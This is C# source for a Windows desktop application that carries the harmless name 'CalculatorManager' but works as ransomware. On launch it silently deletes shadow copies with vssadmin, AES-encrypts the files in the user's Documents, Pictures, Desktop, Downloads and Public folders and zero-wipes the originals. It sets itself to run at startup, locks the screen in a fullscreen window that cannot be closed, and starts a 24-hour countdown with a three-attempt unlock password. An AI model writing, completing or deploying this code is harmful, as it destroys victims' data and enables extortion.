using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Threading;
using Microsoft.Win32;

namespace CalculatorManager
{
    public partial class MainWindow : Window
    {
        private bool _decryptionComplete = false;
        private int _attempts = 0;
        private const int MaxAttempts = 3;
        private readonly TimeSpan _timeout = TimeSpan.FromHours(24);
        private DateTime _expiresAt;
        private DispatcherTimer _timer;

        private static readonly string AppDataFolder =
            Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                "CalculatorManager"
            );
        private static readonly string KeyFilePath =
            Path.Combine(AppDataFolder, "k.dat");
        private static readonly string FlagFilePath =
            Path.Combine(AppDataFolder, "f.lock");
        private const string StoredHashedPassword =
            "bWXY/LU4/zeT1bjobvnsmw==:YoBdcZQgNoX4EmhPofVhcaSW1fBEO5rYrzKcoDqZtpg=";

        public MainWindow()
        {
            InitializeComponent();
            Directory.CreateDirectory(AppDataFolder);
            SetFullScreen();
            AddToStartup();
            EnsureKey();
            AttemptCounter.Text = $"Attempts: 0/{MaxAttempts}";
            StatusMessage.Text = "Proceed with caution.";
            StartTimer();
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            // Always run encryption if no flag present
            if (!File.Exists(FlagFilePath))
            {
                ClearShadowCopies();
                Task.Run(() =>
                {
                    try
                    {
                        EncryptAll();
                        File.WriteAllText(FlagFilePath, DateTime.UtcNow.ToString("o"));
                    }
                    catch (Exception ex)
                    {
                        File.AppendAllText(
                            Path.Combine(AppDataFolder, "error.log"),
                            $"{DateTime.UtcNow:o} FATAL: {ex.Message}\n");
                    }
                });
            }
        }

        private void StartTimer()
        {
            _expiresAt = DateTime.Now.Add(_timeout);
            _timer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(1) };
            _timer.Tick += (s, e) =>
            {
                var rem = _expiresAt - DateTime.Now;
                if (rem <= TimeSpan.Zero)
                {
                    CountdownText.Text = "Time Remaining: 00:00:00";
                    _timer.Stop();
                    StatusMessage.Text = "Time expired. Exiting.";
                    Application.Current.Shutdown();
                }
                else
                {
                    CountdownText.Text = $"Time Remaining: {rem:hh\\:mm\\:ss}";
                }
            };
            _timer.Start();
        }

        private void EnsureKey()
        {
            if (!File.Exists(KeyFilePath))
                GenerateKey();
            else if ((DateTime.Now - File.GetCreationTime(KeyFilePath)).TotalHours > 24)
                SelfDestruct();
        }

        private void GenerateKey()
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 128;
                aes.GenerateKey();
                aes.GenerateIV();
                var blob = new byte[aes.Key.Length + aes.IV.Length];
                Array.Copy(aes.Key, 0, blob, 0, aes.Key.Length);
                Array.Copy(aes.IV, 0, blob, aes.Key.Length, aes.IV.Length);
                File.WriteAllBytes(KeyFilePath, blob);
            }
            File.SetAttributes(KeyFilePath, FileAttributes.Hidden);
        }

        private (byte[] Key, byte[] IV) LoadKey()
        {
            var data = File.ReadAllBytes(KeyFilePath);
            return (
                data.Take(16).ToArray(),
                data.Skip(16).Take(16).ToArray()
            );
        }

        private void EncryptAll()
        {
            var (aesKey, _) = LoadKey();
            string self = Process.GetCurrentProcess().MainModule.FileName;

            foreach (var root in GetTargets())
            {
                SafeEncryptDirectory(root, aesKey, self);
            }
        }

        private void SafeEncryptDirectory(string dir, byte[] aesKey, string self)
        {
            // encrypt files here
            string[] files;
            try { files = Directory.GetFiles(dir); }
            catch { return; }

            foreach (var f in files)
            {
                if (f.EndsWith(".aes", StringComparison.OrdinalIgnoreCase) ||
                    f.Equals(self, StringComparison.OrdinalIgnoreCase))
                    continue;

                try
                {
                    using (var fin = new FileStream(f, FileMode.Open, FileAccess.Read))
                    using (var fout = new FileStream(f + ".aes", FileMode.Create, FileAccess.Write))
                    using (var aes = Aes.Create())
                    {
                        aes.Key = aesKey;
                        aes.GenerateIV();
                        aes.Mode = CipherMode.CBC;
                        aes.Padding = PaddingMode.PKCS7;
                        fout.Write(aes.IV, 0, aes.IV.Length);
                        using (var cs = new CryptoStream(fout, aes.CreateEncryptor(), CryptoStreamMode.Write))
                            fin.CopyTo(cs);
                    }
                    SecureDelete(f);
                }
                catch (Exception ex)
                {
                    File.AppendAllText(
                        Path.Combine(AppDataFolder, "error.log"),
                        $"{DateTime.UtcNow:o} ENCRYPT {f} → {ex.Message}\n");
                }
            }

            // recurse
            string[] subs;
            try { subs = Directory.GetDirectories(dir); }
            catch { return; }

            foreach (var sub in subs)
                SafeEncryptDirectory(sub, aesKey, self);
        }

        private async void Decrypt_Click(object sender, RoutedEventArgs e)
        {
            if (_attempts >= MaxAttempts)
            {
                StatusMessage.Text = "Max attempts reached.";
                return;
            }

            if (!VerifyPassword(PasswordBox.Password))
            {
                _attempts++;
                AttemptCounter.Text = $"Attempts: {_attempts}/{MaxAttempts}";
                StatusMessage.Text = $"Invalid. {_attempts}/{MaxAttempts}";
                return;
            }

            var (aesKey, _) = LoadKey();
            foreach (var root in GetTargets())
            {
                await Task.Run(() => SafeDecryptDirectory(root, aesKey));
            }

            // after decryption, cleanup
            _decryptionComplete = true;
            SecureDelete(KeyFilePath);
            SecureDelete(FlagFilePath);
            SelfDestruct();
        }

        private void SafeDecryptDirectory(string dir, byte[] aesKey)
        {
            string[] files;
            try { files = Directory.GetFiles(dir, "*.aes"); }
            catch { return; }

            foreach (var f in files)
            {
                try
                {
                    using (var fin = new FileStream(f, FileMode.Open, FileAccess.Read))
                    {
                        byte[] iv = new byte[16];
                        fin.Read(iv, 0, iv.Length);
                        using (var aes = Aes.Create())
                        using (var fout = new FileStream(
                            Path.Combine(Path.GetDirectoryName(f),
                                         Path.GetFileNameWithoutExtension(f)),
                            FileMode.Create, FileAccess.Write))
                        using (var cs = new CryptoStream(fin, aes.CreateDecryptor(aesKey, iv), CryptoStreamMode.Read))
                        {
                            aes.Mode = CipherMode.CBC;
                            aes.Padding = PaddingMode.PKCS7;
                            cs.CopyTo(fout);
                        }
                    }
                    File.Delete(f);
                }
                catch (Exception ex)
                {
                    File.AppendAllText(
                        Path.Combine(AppDataFolder, "error.log"),
                        $"{DateTime.UtcNow:o} DECRYPT {f} → {ex.Message}\n");
                }
            }

            string[] subs;
            try { subs = Directory.GetDirectories(dir); }
            catch { return; }
            foreach (var sub in subs)
                SafeDecryptDirectory(sub, aesKey);
        }

        private bool VerifyPassword(string input)
        {
            var parts = StoredHashedPassword.Split(':');
            var salt = Convert.FromBase64String(parts[0]);
            var hash = Convert.FromBase64String(parts[1]);
            using (var pb = new Rfc2898DeriveBytes(input, salt, 100000, HashAlgorithmName.SHA256))
            {
                return pb.GetBytes(32).SequenceEqual(hash);
            }
        }

        private void SecureDelete(string path)
        {
            try
            {
                long len = new FileInfo(path).Length;
                using (var fs = new FileStream(path, FileMode.Open, FileAccess.Write))
                {
                    byte[] zeros = new byte[8192];
                    while (len > 0)
                    {
                        int w = (int)Math.Min(zeros.Length, len);
                        fs.Write(zeros, 0, w);
                        len -= w;
                    }
                    fs.Flush(true);
                }
                File.Delete(path);
            }
            catch { }
        }

        private void ClearShadowCopies()
        {
            try
            {
                var psi = new ProcessStartInfo("vssadmin", "delete shadows /for=C: /all /quiet")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                using (var p = Process.Start(psi))
                    p.WaitForExit();
            }
            catch { }
        }

        private void SelfDestruct()
        {
            ClearShadowCopies();
            try
            {
                using (var rk = Registry.CurrentUser.OpenSubKey(
                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                    rk.DeleteValue("CalculatorManager", false);
            }
            catch { }
            Application.Current.Shutdown();
        }

        private string[] GetTargets()
        {
            return new[]
            {
                Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
                @"C:\Users\Public"
            };
        }

        private void AddToStartup()
        {
            try
            {
                using (var rk = Registry.CurrentUser.OpenSubKey(
                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    rk.SetValue("CalculatorManager",
                        $"\"{Process.GetCurrentProcess().MainModule.FileName}\"");
                }
            }
            catch { }
        }

        private void SetFullScreen()
        {
            WindowStyle = WindowStyle.None;
            WindowState = WindowState.Maximized;
            Topmost = true;
        }
        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            if (!_decryptionComplete)
            {
                e.Cancel = true;
                StatusMessage.Text = "Decryption not complete...";
            }
        }
    }
}
